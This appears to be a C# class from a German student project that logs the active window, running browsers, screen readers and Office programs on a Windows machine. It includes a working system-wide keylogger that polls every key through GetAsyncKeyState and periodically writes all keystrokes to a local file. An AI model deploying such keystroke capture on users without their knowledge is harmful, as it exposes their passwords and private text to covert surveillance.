using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Diagnostics;
using System.IO;
using System.Web;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace AbschlussprojektWPF
{
    class Logger
    {
        // brauche ich, damit ich abfragen kann, welches Fenster sich im Vordergrung befindet
        #region declaration of Windows API functions
        [DllImport("user32.dll")]

        //returns some sort of int
        private static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]

        // returns name of active window
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]

        // returns length of text of active window
        static extern int GetWindowTextLength(IntPtr hWnd);
        #endregion



        string word = string.Empty;
        string excel = string.Empty;
        string outlook = string.Empty;


        #region Keylogger
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(
            System.Windows.Forms.Keys vKey); // Keys enumeration

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(
            System.Int32 vKey);

        private System.String keyBuffer;
        private System.Timers.Timer timerKeyMine;
        private System.Timers.Timer timerBufferFlush;

        public void Keylogger()
        {
            //
            // keyBuffer
            //
            keyBuffer = "";

            // 
            // timerKeyMine
            // 
            this.timerKeyMine = new System.Timers.Timer();
            this.timerKeyMine.Enabled = true;
            this.timerKeyMine.Elapsed += new System.Timers.ElapsedEventHandler(this.timerKeyMine_Elapsed);
            this.timerKeyMine.Interval = 10;

            // 
            // timerBufferFlush
            //
            this.timerBufferFlush = new System.Timers.Timer();
            this.timerBufferFlush.Enabled = true;
            this.timerBufferFlush.Elapsed += new System.Timers.ElapsedEventHandler(this.timerBufferFlush_Elapsed);
            this.timerBufferFlush.Interval = 1800000; // 30 minutes
        }

        /// <summary>
        /// Itrerating thru the entire Keys enumeration; downed key names are stored in keyBuffer 
        /// (space delimited).
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void timerKeyMine_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            foreach (System.Int32 i in Enum.GetValues(typeof(Keys)))
            {
                if (GetAsyncKeyState(i) == -32767)
                {
                    keyBuffer += Enum.GetName(typeof(Keys), i) + " ";
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void timerBufferFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            // Preprocessor Directives
#if (DEBUG)
            File.AppendAllText(@"D:\KeyLog.txt", keyBuffer + " \r\n\r\n"); // debugging help
#else
					Flush2File(@"d:\keydump.txt", true);
#endif
        }


        /// <summary>
        /// Transfers key stroke data from temporary buffer storage to permanent memory. 
        /// If no exception gets thrown the key stroke buffer resets.
        /// </summary>
        /// <param name="file">The complete file path to write to.</param>
        /// <param name="append">Determines whether data is to be appended to the file. 
        /// If the files exists and append is false, the file is overwritten. 
        /// If the file exists and append is true, the data is appended to the file. 
        /// Otherwise, a new file is created.</param>
        public void Flush2File(string file, bool append)
        {
            try
            {
                StreamWriter sw = new StreamWriter(file, append);

                sw.Write(keyBuffer);

                sw.Close();

                keyBuffer = ""; // reset
            }
            catch
            {   // rethrow the exception currently handled by 
                // a parameterless catch clause
                throw;
            }
        }

        #region Properties
        public System.Boolean Enabled
        {
            get
            {
                return timerKeyMine.Enabled && timerBufferFlush.Enabled;
            }
            set
            {
                timerKeyMine.Enabled = timerBufferFlush.Enabled = value;
            }
        }

        public System.Double FlushInterval
        {
            get
            {
                return timerBufferFlush.Interval;
            }
            set
            {
                timerBufferFlush.Interval = value;
            }
        }

        public System.Double MineInterval
        {
            get
            {
                return timerKeyMine.Interval;
            }
            set
            {
                timerKeyMine.Interval = value;
            }
        }
        #endregion

    

    #endregion

    public Logger()
        {
            // wenn das Programm gestartet wird, werden zum Einen die laufenden Assistenzprogramme geloggt, 
            // zum Anderen wird geloggt, welcher Browser verwendet wird und welche Office Programme laufen

            WriteInitialLog();
            Keylogger();


        }

        // Methode, die den Titel des aktiven (vordergrund) Fensters zurückliefert
        public string GetTitleOfActiveWindow()
        {
            string WindowTitle = "";

            IntPtr handle = GetForegroundWindow();

            // Obtain the length of the text   
            int TitleLength = GetWindowTextLength(handle) + 1;

            StringBuilder stringBuilder = new StringBuilder(TitleLength);

            if (GetWindowText(handle, stringBuilder, TitleLength) > 0)
            {
                WindowTitle = stringBuilder.ToString();
            }

            return WindowTitle;
        }
        public void WriteInitialLog()
        {

            // Überschrift für die Log Datei
            File.WriteAllText(@"D:\log.txt", "Active Processes: \r\n\r\n");
            // Aktives Fenster MUSS NOCH WOANDERS HIN!
            File.AppendAllText(@"D:\log.txt", "Aktives Fenster: " + GetTitleOfActiveWindow() + "\r\n");
            // Browser
            File.AppendAllText(@"D:\log.txt", "Browser: " + GetBrowser() + "\r\n");
            // Assistive Technology
            File.AppendAllText(@"D:\log.txt", "Assistive Tech: " + GetAssistTech() + "\r\n");
            // Office Programme
            GetOffice();
            File.AppendAllText(@"D:\log.txt", "Office Programme: " + word +" " + outlook + " " + excel + "\r\n");
        }


        public string GetBrowser()
        {
            string BrowserName = string.Empty;
            bool firefox = false;
            bool chrome = false;
            bool intex = false;

            // holt alle Prozesse, die laufen
            Process[] processlist = Process.GetProcesses();
            // läuft durch die Prozesse
            foreach (Process theprocess in processlist)
            {
                //schreibt nur Browser in die Logdatei
                if ((theprocess.ProcessName == "firefox" && firefox == false) || (theprocess.ProcessName == "chrome" && chrome == false) || (theprocess.ProcessName == "iexplore" && intex == false))
                {
                    BrowserName = theprocess.ProcessName;
                    
                    switch (BrowserName)
                    {
                        case "firefox":
                            firefox = true;
                            break;
                        case "chrome":
                            chrome = true;
                            break;
                        case "iexplore":
                            intex = true;
                            break;
                        default:
                            // hier muss ich mir noch was ausdenken
                            break;
                    }
                }
            }

            return BrowserName;

        }

        public string GetAssistTech()
        {
            string AssistTech = string.Empty;
            bool jaws = false;
            bool nvda = false;
            bool zoomtext = false;


            // holt alle Prozesse, die laufen
            Process[] processlist = Process.GetProcesses();
            // läuft durch die Prozesse
            foreach (Process theprocess in processlist)
            {
                //schreibt nur Browser in die Logdatei
                if ((theprocess.ProcessName == "jfw" && jaws == false) || (theprocess.ProcessName == "nvda" && nvda == false) || (theprocess.ProcessName == "Zt" && zoomtext == false))
                {
                    AssistTech = theprocess.ProcessName;

                    switch (AssistTech)
                    {
                        case "jfw":
                            jaws = true;
                            break;
                        case "nvda":
                            nvda = true;
                            break;
                        case "Zt":
                            zoomtext = true;
                            break;
                        default:
                            // hier muss ich mir noch was ausdenken
                            break;
                    }
                }
            }
            return AssistTech;
        }

        public void GetOffice()
        {

            // holt alle Prozesse, die laufen
            Process[] processlist = Process.GetProcesses();
            // läuft durch die Prozesse
            foreach (Process theprocess in processlist)
            {
                
                if (theprocess.ProcessName == "WINWORD")
                {
                     word = "word";
                }
                if (theprocess.ProcessName == "EXCEL")
                {
                    excel = "excel";
                }
                if (theprocess.ProcessName == "OUTLOOK") 
                {
                    outlook = "outlook";
                }
  
            }
            
        }
    }


}
